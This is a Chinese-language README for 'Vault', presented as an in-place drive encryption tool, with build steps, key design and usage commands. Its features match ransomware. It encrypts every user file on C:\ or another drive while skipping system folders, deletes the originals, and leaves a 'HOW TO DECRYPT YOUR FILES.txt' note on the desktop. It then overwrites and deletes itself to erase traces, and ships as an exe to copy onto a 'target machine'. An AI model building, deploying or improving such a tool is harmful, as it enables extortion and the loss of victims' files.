# Vault — 原地双层级联加密工具

## 文件说明

| 文件 | 作用 |
|------|------|
| `vault.py` | 主程序（加密 / 解密 / 校验，执行后安全自删除） |
| `requirements.txt` | Python 依赖列表 |
| `build.bat` | 一键构建 `vault.exe`（Windows，无需 Python） |

---

## 加密方案

### 三层独立保护

| 层次 | 技术 | 作用 |
|------|------|------|
| 密钥派生 | **Argon2id**（256 MB 内存，3 轮） | 暴力猜密码极其昂贵 |
| 内层加密 | **AES-256-GCM** | 认证加密，篡改即报错 |
| 外层加密 | **ChaCha20-Poly1305** | 即使 AES 被攻破仍有保护 |

```
明文
 └─→ AES-256-GCM  (密钥 A)  →  中间密文
      └─→ ChaCha20-Poly1305 (密钥 B)  →  最终 .vault 文件
```

攻击者必须同时破解两个独立算法才能还原明文。

### 密钥设计（每个文件独立）

```
密码 + 随机盐 ──Argon2id──→ 64 字节主密钥
                               ├─ 前 32 字节 → 头部密钥（加密文件元数据）
                               └─ 后 32 字节 → 会话密钥
                                              └─ HKDF-SHA3-256 + 随机文件种子
                                                  ├─ 密钥 A（AES 层）
                                                  └─ 密钥 B（ChaCha 层）
```

`.vault` 文件头部无任何可识别的魔数，无法从内容判断使用了何种方案。

---

## 工作原理

**原地加密**，不产生副本：

```
加密：  原始文件  ──→  原始文件.vault   （原始文件加密成功后立即删除）
解密：  原始文件.vault  ──→  原始文件   （.vault 文件解密成功后立即删除）
```

`.vault_session` 保存在被加密盘符根目录（如 `C:\.vault_session`），解密时自动读取。

**执行完毕后安全自删除**（任意命令均触发）：

| 步骤 | 做法 |
|------|------|
| ① 随机覆写 7 轮 | `os.urandom` 覆盖全文件 + `fsync`，共 7 次 |
| ② 全零覆写 1 轮 | 写入全零 + `fsync` |
| ③ 直接删除 | 不经回收站，后台脚本在 Python 退出后执行 |
| ④ 清除缓存 | 同时删除 `__pycache__` 目录 |

---

## 安装

### 方式一：构建 exe（目标机器无需 Python）

在任意有 Python 的 Windows 电脑上执行一次：

```cmd
build.bat
```

生成 `dist\vault.exe`，复制到目标机器直接使用。

### 方式二：直接运行源码

```cmd
pip install -r requirements.txt
python vault.py --help
```

---

## 使用教程

> exe 用法与源码完全一致，替换前缀即可：
> `vault encrypt`  ↔  `python vault.py encrypt`

---

### 加密整个 C 盘

```cmd
vault encrypt
```

1. 输入密码（不回显），确认两次
2. 生成主密钥（约 1-2 秒）
3. 自动扫描 `C:\`，跳过系统目录
4. 每个文件就地加密为 `.vault`，原始文件删除
5. 桌面生成 `HOW TO DECRYPT YOUR FILES.txt`（空白，自行填写）
6. **脚本安全自删除**

**加密前后：**
```
加密前：  C:\Users\Alice\报告.docx    C:\Work\代码.py
加密后：  C:\Users\Alice\报告.docx.vault    C:\Work\代码.py.vault
```

---

### 加密其他盘符

```cmd
vault encrypt --drive D
```

---

### 预览跳过/加密的目录（不执行加密）

```cmd
vault encrypt --show-skipped
```

---

### 解密还原

```cmd
vault decrypt
```

所有 `.vault` 文件就地解密，还原为原始文件，`.vault` 删除。

```cmd
vault decrypt --drive D
```

---

### 校验完整性（不修改任何文件）

```cmd
vault verify
```

---

### 调整并行线程数

```cmd
vault encrypt --workers 8
vault decrypt --workers 8
```

默认 4 线程，SSD 可调到 8。

---

### 指定密码（自动化）

```cmd
vault encrypt --password "你的强密码"
vault decrypt --password "你的强密码"
```

> 命令行密码可能被系统日志记录，建议交互式输入。

---

## 自动跳过的系统目录

| 目录 | 说明 |
|------|------|
| `C:\Windows` | Windows 系统文件 |
| `C:\Windows.old` | 系统升级残留 |
| `C:\$Recycle.Bin` | 回收站 |
| `C:\Recovery` | 系统恢复分区 |
| `C:\System Volume Information` | 系统卷信息 |
| `C:\Boot` | 启动引导文件 |
| `C:\PerfLogs` | 性能日志 |
| `C:\MSOCache` | Office 安装缓存 |
| `pagefile.sys` / `hiberfil.sys` / `swapfile.sys` | 系统虚拟内存文件 |

---

## .vault_session 文件

| 字段 | 大小 | 内容 |
|------|------|------|
| Argon2id 盐 | 32 字节 | 密码 → 主密钥推导所需 |
| 验证 nonce | 12 字节 | 随机 |
| 验证密文 | 24 字节 | 校验密码正确性 |

- **不含密钥本身**，泄露后仍需正确密码才能解密
- 保存在盘符根目录，**勿删除**

---

## 密码建议

- 长度 ≥ 20 字符，含大小写、数字、符号
- Argon2id（256 MB + 3 轮）：GPU 每秒仅能尝试约 3-5 次密码
- **忘记密码则无法恢复任何文件**，请用密码管理器保存

---

## 常见问题

**Q：加密中途中断怎么办？**  
A：已完成的文件保持 `.vault` 状态不受影响；重新运行会跳过已有 `.vault` 文件继续处理未完成的文件。

**Q：.vault_session 文件被删了怎么办？**  
A：无法解密。该文件包含 Argon2id 盐，缺失后无法从密码重新推导主密钥。

**Q：.vault 文件能看出原始文件名吗？**  
A：文件系统路径保留（如 `报告.docx.vault`），但内容、大小、元数据均已加密，无法从文件内容推断任何信息。
